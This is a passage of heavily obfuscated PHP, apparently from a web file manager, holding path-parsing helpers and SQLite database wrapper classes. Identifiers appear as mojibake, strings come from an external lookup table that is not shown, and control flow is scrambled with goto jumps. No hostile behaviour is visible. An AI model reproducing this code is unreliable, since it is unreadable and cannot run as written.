KodIO::KOD_SOURCE) { $bœÇƒ†∫Çã = Model($A¨…ûÏË¶¿[744])->fileInfoGet(KodIO::sourceID($cˆàüñ¡⁄∏)); if (!$bœÇƒ†∫Çã[$A¨…ûÏË¶¿[85]]) { show_json($A¨…ûÏË¶¿[1033], !1); } $cˆàüñ¡⁄∏ = $bœÇƒ†∫Çã[$A¨…ûÏË¶¿[85]]; } $B‘ÌãŒ⁄ﬂ¨ = self::init($cˆàüñ¡⁄∏); $fÍ“πà•û… = $B‘ÌãŒ⁄ﬂ¨->getType(); goto BÖôÂÇ¬É‚; bõë…—Çæ‡: $A¨…ûÏË¶¿ =& $_SERVER[Æ¡î¢≠¯™]; if ($FÊÀöäéé© == $A¨…ûÏË¶¿[1031] && strtoupper(substr(PHP_OS, 0, 3)) == $A¨…ûÏË¶¿[1032]) { return !1; } $Bä©≠Ë«çØ = KodIO::parse($cˆàüñ¡⁄∏); goto c Ïﬁ‚ıøí; BÖôÂÇ¬É‚: if ($fÍ“πà•û… == $A¨…ûÏË¶¿[113] || $fÍ“πà•û… == $A¨…ûÏË¶¿[1034]) { if (!$B‘ÌãŒ⁄ﬂ¨->exist($B‘ÌãŒ⁄ﬂ¨->path)) { show_json(LNG($A¨…ûÏË¶¿[112]), !1); } return $B‘ÌãŒ⁄ﬂ¨->path; } return !1; goto cí¥Ç…Ÿ¬‹; cí¥Ç…Ÿ¬‹: } private static function archiveExt($F¨íá¨ Ù§ = '') { $GLOBALS[$_SERVER[Æ¡î¢≠¯™][1035]] = $F¨íá¨ Ù§; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\122\145\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\106\x69\154\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\151\x6c\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\165\x70\x52\157\157\164\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\150\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\x53\x68\141\162\145\x4c\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\x72\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\145\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\x65\111\x74\145\x6d\x4c\151\156\153\175"; const KOD_SEARCH = "\x7b\163\145\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\142\154\157\143\153\x7d"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\173\165\x73\145\x72\122\x65\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\145\162\175"; public static function typeList() { $cçâº…§Ê‚ =& $_SERVER[Æ¡î¢≠¯™]; return array($cçâº…§Ê‚[1036] => self::KOD_SOURCE, $cçâº…§Ê‚[1037] => self::KOD_USER_RECYCLE, $cçâº…§Ê‚[1038] => self::KOD_USER_FAV, $cçâº…§Ê‚[1039] => self::KOD_USER_FILE_TAG, $cçâº…§Ê‚[1040] => self::KOD_USER_FILE_TYPE, $cçâº…§Ê‚[1041] => self::KOD_GROUP_ROOT_SELF, $cçâº…§Ê‚[1042] => self::KOD_USER_SHARE, $cçâº…§Ê‚[1043] => self::KOD_USER_SHARE_LINK, $cçâº…§Ê‚[1044] => self::KOD_USER_SHARE_TO_ME, $cçâº…§Ê‚[1045] => self::KOD_SHARE_ITEM, $cçâº…§Ê‚[1046] => self::KOD_SHARE_LINK, $cçâº…§Ê‚[1047] => self::KOD_SEARCH, $cçâº…§Ê‚[1048] => self::KOD_BLOCK, $cçâº…§Ê‚[1049] => self::KOD_IO, $cçâº…§Ê‚[1050] => self::KOD_USER_RECENT, $cçâº…§Ê‚[1051] => self::KOD_USER_DRIVER); } public static function parse($f¬Ñ•ã¡Øé) { goto bÓ˜èµçäü; e‚ºò˜⁄Ú¨: preg_match($F«ÊÙ„±›ﬁ[1052], $f¬Ñ•ã¡Øé, $F˜£À≠“ªë); $dôòë˘è±Ø = array($F«ÊÙ„±›ﬁ[393] => !1, $F«ÊÙ„±›ﬁ[1053] => !1, $F«ÊÙ„±›ﬁ[390] => !1, $F«ÊÙ„±›ﬁ[85] => $f¬Ñ•ã¡Øé, $F«ÊÙ„±›ﬁ[998] => !1, $F«ÊÙ„±›ﬁ[997] => $F«ÊÙ„±›ﬁ[33]); if (is_array($F˜£À≠“ªë) && count($F˜£À≠“ªë) == 5) { $e∑¶Ûπˆﬂπ = $F«ÊÙ„±›ﬁ[1054] . $F˜£À≠“ªë[2] . $F«ÊÙ„±›ﬁ[321]; if (in_array($e∑¶Ûπˆﬂπ, $dÓÔè¥¢¬Ô)) { $dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[998]] = $F˜£À≠“ªë[1]; $dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[29]] = $e∑¶Ûπˆﬂπ; $dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[1055]] = substr($e∑¶Ûπˆﬂπ, 1, -1); $dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[372]] = $F˜£À≠“ªë[3]; } $dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[997]] = $F˜£À≠“ªë[4]; } goto BÊâÕâ¿∑»; bÓ˜èµçäü: $F«ÊÙ„±›ﬁ =& $_SERVER[Æ¡î¢≠¯™]; $f¬Ñ•ã¡Øé = self::clear($f¬Ñ•ã¡Øé); $dÓÔè¥¢¬Ô = array_values(self::typeList()); goto e‚ºò˜⁄Ú¨; BÊâÕâ¿∑»: $dÁ…Ñò·¡ = array($F«ÊÙ„±›ﬁ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[1056]] = in_array($dôòë˘è±Ø[$F«ÊÙ„±›ﬁ[29]], $dÁ…Ñò·¡); return $dôòë˘è±Ø; goto cÑ…Çã…ÇÜ; cÑ…Çã…ÇÜ: } public static function clear($D»ººñÊµ∂) { goto FÃÒ¥çœïÒ; FúÇœ◊◊ÒÎ: if (substr($D»ººñÊµ∂, 0, 3) == $Eçø“öµò†[1058]) { $D»ººñÊµ∂ = substr($D»ººñÊµ∂, 3); } while (strstr($D»ººñÊµ∂, $aÆ‡ºΩıôÉ)) { $D»ººñÊµ∂ = str_replace($aÆ‡ºΩıôÉ, $Eçø“öµò†[8], $D»ººñÊµ∂); } $D»ººñÊµ∂ = preg_replace($Eçø“öµò†[1059], $Eçø“öµò†[8], $D»ººñÊµ∂); goto F€ÚÙ‰á∂Î; FÃÒ¥çœïÒ: $Eçø“öµò† =& $_SERVER[Æ¡î¢≠¯™]; $D»ººñÊµ∂ = str_replace($Eçø“öµò†[105], $Eçø“öµò†[8], $D»ººñÊµ∂); $aÆ‡ºΩıôÉ = $Eçø“öµò†[1057]; goto FúÇœ◊◊ÒÎ; F€ÚÙ‰á∂Î: if ($D»ººñÊµ∂ == $Eçø“öµò†[8]) { return $Eçø“öµò†[8]; } $D»ººñÊµ∂ = rtrim($D»ººñÊµ∂, $Eçø“öµò†[8]); return $D»ººñÊµ∂; goto C·é‚ñ⁄à‚; C·é‚ñ⁄à‚: } public static function sourceID($BΩ„›è•Œè) { $C®ÔÓóéÂµ =& $_SERVER[Æ¡î¢≠¯™]; $Cì©“í€‹Ì = self::parse($BΩ„›è•Œè); if ($Cì©“í€‹Ì[$C®ÔÓóéÂµ[29]] !== self::KOD_SOURCE) { show_json(LNG($C®ÔÓóéÂµ[1060]), !1); } return $Cì©“í€‹Ì[$C®ÔÓóéÂµ[372]]; } public static function make($e ü˜ ôÖÁ) { if (!$e ü˜ ôÖÁ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($e ü˜ ôÖÁ)); } public static function makeShare($féΩëä”„á, $a¶ßµ†Ìé·) { return self::makePath(self::KOD_SHARE_ITEM, $féΩëä”„á, $a¶ßµ†Ìé·); } public static function makeFileTypePath($e≠âÆ≤î¿) { return self::makePath(self::KOD_USER_FILE_TYPE, $e≠âÆ≤î¿); } public static function makeFileTagPath($e”í∞ÎèÇ´) { return self::makePath(self::KOD_USER_FILE_TAG, $e”í∞ÎèÇ´); } public static function makePath($aΩ∫∫ˆË‚ç, $Cé‰ÆÈ≠ëî = '', $cíπ‰ßä◊ö = '') { $c∞ˆäŸÀ’ =& $_SERVER[Æ¡î¢≠¯™]; $a¶È†∫ÉÈÆ = substr($aΩ∫∫ˆË‚ç, 1, -1); $EØΩ¶¡¥…ë = $c∞ˆäŸÀ’[1061] . $a¶È†∫ÉÈÆ . $c∞ˆäŸÀ’[1062] . $Cé‰ÆÈ≠ëî . $c∞ˆäŸÀ’[1063]; $EØΩ¶¡¥…ë = $cíπ‰ßä◊ö ? $EØΩ¶¡¥…ë . $cíπ‰ßä◊ö . $c∞ˆäŸÀ’[8] : $EØΩ¶¡¥…ë; return $EØΩ¶¡¥…ë; } public static function hashPath($EÑÆ¢ºüÙŒ) { $A≈ﬂÕ∑ˆ≥„ =& $_SERVER[Æ¡î¢≠¯™]; $bﬁêëéä—ﬁ = is_array($EÑÆ¢ºüÙŒ) ? $EÑÆ¢ºüÙŒ : IO::info($EÑÆ¢ºüÙŒ); $A≠Ï°¬È£î = _get($bﬁêëéä—ﬁ, $A≈ﬂÕ∑ˆ≥„[1064], $A≈ﬂÕ∑ˆ≥„[33]); if (!$A≠Ï°¬È£î) { $EÕÑ¯é¶Ç⁄ = KodIO::parse($bﬁêëéä—ﬁ[$A≈ﬂÕ∑ˆ≥„[85]]); if (!$EÕÑ¯é¶Ç⁄[$A≈ﬂÕ∑ˆ≥„[29]]) { $A≠Ï°¬È£î = IO::hashSimple($bﬁêëéä—ﬁ[$A≈ﬂÕ∑ˆ≥„[85]]); } } if (!$A≠Ï°¬È£î) { $A≠Ï°¬È£î = md5($bﬁêëéä—ﬁ[$A≈ﬂÕ∑ˆ≥„[85]] . $bﬁêëéä—ﬁ[$A≈ﬂÕ∑ˆ≥„[87]] . $bﬁêëéä—ﬁ[$A≈ﬂÕ∑ˆ≥„[117]]); } return $A≠Ï°¬È£î; } public static function initSystemPath() { $eëÀê ±π =& $_SERVER[Æ¡î¢≠¯™]; if (defined($eëÀê ±π[1065])) { return; } define($eëÀê ±π[1065], self::systemPath($eëÀê ±π[1066])); define($eëÀê ±π[1067], self::systemPath($eëÀê ±π[1068])); define($eëÀê ±π[1069], self::systemPath($eëÀê ±π[1070])); define($eëÀê ±π[1071], self::systemPath($eëÀê ±π[1072])); } private static function systemPath($D‚ÇÁ‹Óöá) { goto BÚÓªÖçøÙ; fÉ≥Éà©È’: return $dØ·üÿÂ”å; goto c¿˜ﬁÛúÙì; BÚÓªÖçøÙ: $EñÁÒÜß»‰ =& $_SERVER[Æ¡î¢≠¯™]; $CÁåêøä€â = $EñÁÒÜß»‰[1073] . ucfirst($D‚ÇÁ‹Óöá); $dØ·üÿÂ”å = Model($EñÁÒÜß»‰[1074])->get($CÁåêøä€â); goto Aÿúπﬂ⁄≠•; Aÿúπﬂ⁄≠•: if ($dØ·üÿÂ”å) { return $dØ·üÿÂ”å; } if ($D‚ÇÁ‹Óöá == $EñÁÒÜß»‰[1066]) { $dØ·üÿÂ”å = self::make(Model($EñÁÒÜß»‰[744])->systemRootPathAdd($EñÁÒÜß»‰[1075])); } else { $dØ·üÿÂ”å = self::systemPath($EñÁÒÜß»‰[1066]); $c–«ﬁ≠≠ú¨ = self::sourceID($dØ·üÿÂ”å); $dØ·üÿÂ”å = self::make(Model($EñÁÒÜß»‰[744])->mkdir($c–«ﬁ≠≠ú¨, $D‚ÇÁ‹Óöá)); } Model($EñÁÒÜß»‰[1074])->set($CÁåêøä€â, $dØ·üÿÂ”å); goto fÉ≥Éà©È’; c¿˜ﬁÛúÙì: } public static function systemFolder($eÈ˜´òÈñì) { $aâå€ûãÂî = IO_PATH_SYSTEM_SOURCE . $eÈ˜´òÈñì; $Bùù±§ƒÔ® = Cache::get($aâå€ûãÂî); if (!$Bùù±§ƒÔ®) { $fû≤õÿ·√« = IO::infoFull($aâå€ûãÂî); if (!$fû≤õÿ·√«) { $Bùù±§ƒÔ® = IO::mkdir($aâå€ûãÂî, REPEAT_SKIP); } else { $Bùù±§ƒÔ® = $fû≤õÿ·√«[$_SERVER[Æ¡î¢≠¯™][85]]; } Cache::set($aâå€ûãÂî, $Bùù±§ƒÔ®, 3600 * 10); } return $Bùù±§ƒÔ®; } public static function defaultDriver() { return Model($_SERVER[Æ¡î¢≠¯™][696])->defaultDriver(); } public static function defaultIO() { $a¢‚⁄ü®üã =& $_SERVER[Æ¡î¢≠¯™]; $b˜úÁÖ∏ü∑ = self::defaultDriver(); return $a¢‚⁄ü®üã[1076] . $b˜úÁÖ∏ü∑[$a¢‚⁄ü®üã[372]] . $a¢‚⁄ü®üã[1063]; } public static function fileTypeList() { $bîªÎ”éäõ =& $_SERVER[Æ¡î¢≠¯™]; $AâÕÔØö»ı = $GLOBALS[$bîªÎ”éäõ[6]][$bîªÎ”éäõ[1077]]; foreach ($AâÕÔØö»ı as $f•÷¥è±«´ => $d≠÷¿‡ﬁ∂∑) { $DΩ•ØáæÊÈ = $bîªÎ”éäõ[1078] . $f•÷¥è±«´; $Bµ’Ó°œ∞§ = LNG($DΩ•ØáæÊÈ); if ($DΩ•ØáæÊÈ != $Bµ’Ó°œ∞§) { $AâÕÔØö»ı[$f•÷¥è±«´][$bîªÎ”éäõ[28]] = $Bµ’Ó°œ∞§; } } return $AâÕÔØö»ı; } } goto Aéçé»Ï◊µ; dªËøîœ’Ú: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto BË–¨ÏëÂ; c•÷ÔŸ±Àã: $this->in =& $in; $this->values[$aôá‚÷√âœ[6]] =& $config; $this->values[$aôá‚÷√âœ[7]] =& $in; goto EáŒû€≈Ãö; BË–¨ÏëÂ: $aôá‚÷√âœ =& $_SERVER[Æ¡î¢≠¯™]; global $in, $config; $this->config =& $config; goto c•÷ÔŸ±Àã; EáŒû€≈Ãö: $this->tpl = TEMPLATE . MOD . $aôá‚÷√âœ[8]; $this->_classObjectID = mt_rand(0, 10000); goto dÚÑÜêƒ»’; dÚÑÜêƒ»’: } public function loadClass($fØÑÙ≠¡ô›) { if (1 === func_num_args()) { $this->{$fØÑÙ≠¡ô›} = new $fØÑÙ≠¡ô›(); } else { $EÂôâàÌâ◊ = new ReflectionClass($fØÑÙ≠¡ô›); $FÒÎÊ∞í ¨ = func_get_args(); array_shift($FÒÎÊ∞í ¨); $this->{$fØÑÙ≠¡ô›} = $EÂôâàÌâ◊->newInstanceArgs($FÒÎÊ∞í ¨); } return $this->{$fØÑÙ≠¡ô›}; } protected function assign($e–±Ë∆ÿﬁõ, $eíö‹ªù∏î) { $this->values[$e–±Ë∆ÿﬁõ] = $eíö‹ªù∏î; } protected function display($aå£ªãëÃ») { ob_end_clean(); extract($this->values); require $this->tpl . $aå£ªãëÃ»; } } class DbSqliteBase extends Db { public function __construct($bﬂ±®ù´˘∑ = '') { $bàâÔ˘ı⁄ =& $_SERVER[Æ¡î¢≠¯™]; if (!extension_loaded($bàâÔ˘ı⁄[9])) { think_exception(think_lang($bàâÔ˘ı⁄[10]) . $bàâÔ˘ı⁄[11]); } if (!empty($bﬂ±®ù´˘∑)) { if (!isset($bﬂ±®ù´˘∑[$bàâÔ˘ı⁄[12]])) { $bﬂ±®ù´˘∑[$bàâÔ˘ı⁄[12]] = 438; } $this->config = $bﬂ±®ù´˘∑; if (empty($this->config[$bàâÔ˘ı⁄[13]])) { $this->config[$bàâÔ˘ı⁄[13]] = array(); } } } public function connect($eÏàπÖå±• = '', $bñ≠≈„çî⁄ = 0) { $Eºó¢®Ê”Ó =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->linkID[$bñ≠≈„çî⁄])) { goto C†ß‚çï¬’; C≥“ıÉ¿Ü: @sqlite_busy_timeout($this->linkID[$bñ≠≈„çî⁄], 30000); if (1 != think_config($Eºó¢®Ê”Ó[18])) { unset($this->config); } goto dœ√Ê≥¨è¶; C†ß‚çï¬’: if (empty($eÏàπÖå±•)) { $eÏàπÖå±• = $this->config; } $f≠ù—™¡Ó¡ = !empty($eÏàπÖå±•[$Eºó¢®Ê”Ó[13]][$Eºó¢®Ê”Ó[14]]) ? $eÏàπÖå±•[$Eºó¢®Ê”Ó[13]][$Eºó¢®Ê”Ó[14]] : $this->pconnect; $A√ÂÃ¡ò∂â = $f≠ù—™¡Ó¡ ? $Eºó¢®Ê”Ó[15] : $Eºó¢®Ê”Ó[16]; goto DﬁÂ∫çˆó; DﬁÂ∫çˆó: $this->linkID[$bñ≠≈„çî⁄] = $A√ÂÃ¡ò∂â($eÏàπÖå±•[$Eºó¢®Ê”Ó[17]], $eÏàπÖå±•[$Eºó¢®Ê”Ó[12]]); if (!$this->linkID[$bñ≠≈„çî⁄]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto C≥“ıÉ¿Ü; dœ√Ê≥¨è¶: } return $this->linkID[$bñ≠≈„çî⁄]; } public function free() { $this->queryID = null; } public function query($b·Î‘√Ü◊‚) { goto dàÿçî„áÑ; dÁíÀ´Á®„: $this->queryStr = $b·Î‘√Ü◊‚; if ($this->queryID) { $this->free(); } think_action_status($c¶Ôﬁíá°´[19], 1); goto E–≥‰⁄ÜÏé; dàÿçî„áÑ: $c¶Ôﬁíá°´ =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dÁíÀ´Á®„; Cﬁï±¯≠Óœ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $FÊÒÔ»÷ç∫ = $this->getAll(); return $FÊÒÔ»÷ç∫; } goto c»Ï÷ ÏÜ¯; E–≥‰⁄ÜÏé: think_status($c¶Ôﬁíá°´[20]); $this->queryID = sqlite_query($this->_linkID, $b·Î‘√Ü◊‚); $this->debug(); goto Cﬁï±¯≠Óœ; c»Ï÷ ÏÜ¯: } public function execute($a÷œÒò¢¬ó) { goto fπÌø∏€µ¨; C“Ω«Ô»¡†: if (!1 === $CáÁÀ≤é≤≤) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto dÊ◊ÚÑå÷ê; fπÌø∏€µ¨: $cÀ≤∆Ω†Ú¯ =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F‹çöˆπËë; F‹çöˆπËë: $this->queryStr = $a÷œÒò¢¬ó; if ($this->queryID) { $this->free(); } think_action_status($cÀ≤∆Ω†Ú¯[21], 1); goto B…€¶ÿıÌÖ; B…€¶ÿıÌÖ: think_status($cÀ≤∆Ω†Ú¯[20]); $CáÁÀ≤é≤≤ = sqlite_exec($this->_linkID, $a÷œÒò¢¬ó); $this->debug(); goto C“Ω«Ô»¡†; dÊ◊ÚÑå÷ê: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Æ¡î¢≠¯™][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Fúèßè≥€± = sqlite_query($this->_linkID, $_SERVER[Æ¡î¢≠¯™][23]); if (!$Fúèßè≥€±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bëä≥ÿÌ”ó = sqlite_query($this->_linkID, $_SERVER[Æ¡î¢≠¯™][24]); if (!$Bëä≥ÿÌ”ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aÂﬂÈñÇ¶ = array(); if ($this->numRows > 0) { for ($A√ÿ¡ê≈û÷ = 0; $A√ÿ¡ê≈û÷ < $this->numRows; $A√ÿ¡ê≈û÷++) { $aÂﬂÈñÇ¶[$A√ÿ¡ê≈û÷] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $aÂﬂÈñÇ¶; } public function getFields($DôéÁ◊•πì) { $A£ßøÏ»ü∫ =& $_SERVER[Æ¡î¢≠¯™]; $c£◊À‡ ˜à = $this->query($A£ßøÏ»ü∫[25] . $DôéÁ◊•πì . $A£ßøÏ»ü∫[26]); $däô∞Œ€’¬ = array(); if ($c£◊À‡ ˜à) { foreach ($c£◊À‡ ˜à as $a‡ÚÛè¬ì¶ => $bê˘°È‰¯ú) { $däô∞Œ€’¬[$bê˘°È‰¯ú[$A£ßøÏ»ü∫[27]]] = array($A£ßøÏ»ü∫[28] => $bê˘°È‰¯ú[$A£ßøÏ»ü∫[27]], $A£ßøÏ»ü∫[29] => $bê˘°È‰¯ú[$A£ßøÏ»ü∫[30]], $A£ßøÏ»ü∫[31] => (bool) ($bê˘°È‰¯ú[$A£ßøÏ»ü∫[32]] === $A£ßøÏ»ü∫[33]), $A£ßøÏ»ü∫[34] => $bê˘°È‰¯ú[$A£ßøÏ»ü∫[35]], $A£ßøÏ»ü∫[36] => strtolower($bê˘°È‰¯ú[$A£ßøÏ»ü∫[37]]) == $A£ßøÏ»ü∫[38], $A£ßøÏ»ü∫[39] => strtolower($bê˘°È‰¯ú[$A£ßøÏ»ü∫[40]]) == $A£ßøÏ»ü∫[41]); } } return $däô∞Œ€’¬; } public function getTables($EÕ±˜º¿¬¢ = '') { $Dêˆ¶˘∑ò› =& $_SERVER[Æ¡î¢≠¯™]; $CÏºö¥≠®£ = $this->query($Dêˆ¶˘∑ò›[42] . $Dêˆ¶˘∑ò›[43] . $Dêˆ¶˘∑ò›[44]); $dóÑ£≠ÑÕ∆ = array(); foreach ($CÏºö¥≠®£ as $eÖç‡∑Áü¡ => $Bäô»‰¶ÚÌ) { $dóÑ£≠ÑÕ∆[$eÖç‡∑Áü¡] = current($Bäô»‰¶ÚÌ); } return $dóÑ£≠ÑÕ∆; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $aÙÔ—∫πû√ =& $_SERVER[Æ¡î¢≠¯™]; $Föﬂ≠·Ú¶ƒ = sqlite_last_error($this->_linkID); $this->error = $Föﬂ≠·Ú¶ƒ . $aÙÔ—∫πû√[4] . sqlite_error_string($Föﬂ≠·Ú¶ƒ); if ($aÙÔ—∫πû√[33] != $this->queryStr) { $this->error .= LNG($aÙÔ—∫πû√[45]) . $this->queryStr; } think_trace($this->error, $aÙÔ—∫πû√[33], $aÙÔ—∫πû√[46]); return $this->error; } public function escapeString($FÈ∂Í‘ãÃ’) { return sqlite_escape_string($FÈ∂Í‘ãÃ’); } public function parseLimit($bÎøˆ”çŸÑ) { $Bå≠ÖÎó¶å =& $_SERVER[Æ¡î¢≠¯™]; $FØæºá⁄åΩ = $Bå≠ÖÎó¶å[33]; if (!empty($bÎøˆ”çŸÑ)) { $bÎøˆ”çŸÑ = explode($Bå≠ÖÎó¶å[47], $bÎøˆ”çŸÑ); if (count($bÎøˆ”çŸÑ) > 1) { $FØæºá⁄åΩ .= $Bå≠ÖÎó¶å[48] . $bÎøˆ”çŸÑ[1] . $Bå≠ÖÎó¶å[49] . $bÎøˆ”çŸÑ[0] . $Bå≠ÖÎó¶å[50]; } else { $FØæºá⁄åΩ .= $Bå≠ÖÎó¶å[48] . $bÎøˆ”çŸÑ[0] . $Bå≠ÖÎó¶å[50]; } } return $FØæºá⁄åΩ; } } class DbSqlite3Base extends Db { public function __construct($Cù∂ºˆÑíÂ = '') { $C‚»’ÿ™Ìû =& $_SERVER[Æ¡î¢≠¯™]; if (!class_exists($C‚»’ÿ™Ìû[51])) { think_exception(think_lang($C‚»’ÿ™Ìû[10]) . $C‚»’ÿ™Ìû[52]); } if (!empty($Cù∂ºˆÑíÂ)) { if (!isset($Cù∂ºˆÑíÂ[$C‚»’ÿ™Ìû[12]])) { $Cù∂ºˆÑíÂ[$C‚»’ÿ™Ìû[12]] = 438; } $this->config = $Cù∂ºˆÑíÂ; if (empty($this->config[$C‚»’ÿ™Ìû[13]])) { $this->config[$C‚»’ÿ™Ìû[13]] = array(); } } } public function connect($F∂ÃâÁÖÑ° = '', $fñ™Ã†˜·• = 0) { $cÀπıÃå¶â =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->linkID[$fñ™Ã†˜·•])) { if (empty($F∂ÃâÁÖÑ°)) { $F∂ÃâÁÖÑ° = $this->config; } $this->linkID[$fñ™Ã†˜·•] = new SQLite3($F∂ÃâÁÖÑ°[$cÀπıÃå¶â[17]]); if (!$this->linkID[$fñ™Ã†˜·•]) { think_exception($this->linkID[$fñ™Ã†˜·•]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$fñ™Ã†˜·•]->busyTimeout(30000); if (1 != think_config($cÀπıÃå¶â[18])) { unset($this->config); } } return $this->linkID[$fñ™Ã†˜·•]; } public function free() { $this->queryID = null; } public function query($aÆÜœÂõÜ«) { goto fÇµë‘àë¶; fõåÖÙÆú£: think_status($Aà›ã¥€‚Ç[20]); $this->queryID = $this->_linkID->query($aÆÜœÂõÜ«); $this->debug(); goto F—πµÊ‘˜¶; F—πµÊ‘˜¶: if (!1 === $this->queryID) { $this->error(); return !1; } else { $dÑæù®ÿ˘« = $this->getAll(); $this->numRows = count($dÑæù®ÿ˘«); return $dÑæù®ÿ˘«; } goto e´ÎçÔ∂⁄ﬂ; fÇµë‘àë¶: $Aà›ã¥€‚Ç =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÛµ◊‰€åÿ; EÛµ◊‰€åÿ: $this->queryStr = $aÆÜœÂõÜ«; if ($this->queryID) { $this->free(); } think_action_status($Aà›ã¥€‚Ç[19], 1); goto fõåÖÙÆú£; e´ÎçÔ∂⁄ﬂ: } public function execute($eÉ∆«ÖãÖ) { goto eÚ„≠ö»ï©; få……ÍÑ«ˆ: think_status($FÈÇ¬å÷¢≠[20]); $Dàœôò§Î = $this->_linkID->exec($eÉ∆«ÖãÖ); $this->debug(); goto c“ìÜÍÁ∏Æ; eÚ„≠ö»ï©: $FÈÇ¬å÷¢≠ =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f‰úµ€¬Ô®; c“ìÜÍÁ∏Æ: if (!1 === $Dàœôò§Î) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto a¿œ©ß÷≈Œ; f‰úµ€¬Ô®: $this->queryStr = $eÉ∆«ÖãÖ; if ($this->queryID) { $this->free(); } think_action_status($FÈÇ¬å÷¢≠[21], 1); goto få……ÍÑ«ˆ; a¿œ©ß÷≈Œ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Æ¡î¢≠¯™][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f⁄ùÌ™·á÷ = $this->_linkID->query($_SERVER[Æ¡î¢≠¯™][23]); if (!$f⁄ùÌ™·á÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fŒñúΩÓÎ¡ = $this->_linkID->query($_SERVER[Æ¡î¢≠¯™][24]); if (!$fŒñúΩÓÎ¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fÉÉøí›Éæ = array(); while ($E∑íÎÔèﬁ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fÉÉøí›Éæ[] = $E∑íÎÔèﬁ; } $this->queryID->reset(); return $fÉÉøí›Éæ; } public function getFields($a™„⁄∞”ÚŸ) { $dâ∞Á…óª™ =& $_SERVER[Æ¡î¢≠¯™]; $FøÒÊùõ®Ã = $this->query($dâ∞Á…óª™[25] . $a™„⁄∞”ÚŸ . $dâ∞Á…óª™[26]); $eœÂ±°—öå = array(); if ($FøÒÊùõ®Ã) { foreach ($FøÒÊùõ®Ã as $AÖÕŒé¿â© => $FÁ∆ÒÜÒ•Â) { $eœÂ±°—öå[$FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[28]]] = array($dâ∞Á…óª™[28] => $FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[28]], $dâ∞Á…óª™[29] => $FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[29]], $dâ∞Á…óª™[31] => (bool) ($FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[31]] === $dâ∞Á…óª™[33]), $dâ∞Á…óª™[34] => $FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[53]], $dâ∞Á…óª™[36] => (bool) $FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[54]], $dâ∞Á…óª™[39] => (bool) $FÁ∆ÒÜÒ•Â[$dâ∞Á…óª™[54]]); } } return $eœÂ±°—öå; } public function getTables($F˜Ü¢çêñ» = '') { $eî¯™í∂∫“ =& $_SERVER[Æ¡î¢≠¯™]; $f€àÊπ≠»Ç = $this->query($eî¯™í∂∫“[42] . $eî¯™í∂∫“[43] . $eî¯™í∂∫“[44]); $E¬ — èöÎ = array(); foreach ($f€àÊπ≠»Ç as $b¡¢áá≈Ã∞ => $FÀíˆﬂ¡ÁÎ) { $E¬ — èöÎ[$b¡¢áá≈Ã∞] = 